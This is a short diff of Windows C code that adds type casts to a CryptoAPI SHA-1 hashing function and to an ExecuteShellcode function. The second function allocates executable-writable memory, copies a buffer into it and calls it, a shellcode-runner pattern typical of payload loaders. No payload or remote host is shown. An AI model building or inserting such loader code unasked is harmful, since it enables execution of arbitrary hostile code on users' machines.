@@ -250,18 +250,18 @@ HGLOBAL GenerateHash(BYTE *src, unsigned int len) {
 		if (CryptCreateHash(hProv, CALG_SHA1, (HCRYPTKEY) NULL, (DWORD) NULL, &hHash)) {
 
 			// Hash the data
-			if (CryptHashData(hHash, src, len, NULL)) {
+			if (CryptHashData(hHash, src, len, (DWORD) NULL)) {
 
 				// We know it is SHA-1 and therefore 160-bit but I left this in to make it
 				// easier and more resilient to changes in hash algorithm choice etc. Therefore,
 				// request the hash size from the CryptoAPI and make sure its 20 bytes (160 bit)
 				hash_size_needed_len = 4;
-				if (CryptGetHashParam(hHash, HP_HASHSIZE, &hash_size_needed, &hash_size_needed_len, (DWORD) NULL) && hash_size_needed == 20) {
+				if (CryptGetHashParam(hHash, HP_HASHSIZE, (BYTE *) &hash_size_needed, (DWORD *) &hash_size_needed_len, (DWORD) NULL) && hash_size_needed == 20) {
 
 					// Now allocate memory for the hash
 					if (hash_value = calloc(hash_size_needed, 1)) {
 
-						if (CryptGetHashParam(hHash, HP_HASHVAL, hash_value, &hash_size_needed, NULL)) {
+						if (CryptGetHashParam(hHash, HP_HASHVAL, hash_value, &hash_size_needed, (DWORD) NULL)) {
 							ret = hash_value;
 						}
 
@@ -289,7 +289,7 @@ void ExecuteShellcode(BYTE *buf, unsigned int size) {
 
 	buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(buffer, buf, size);
-	sc = buffer;
+	sc = (void *) buffer;
 	sc();
 
 }
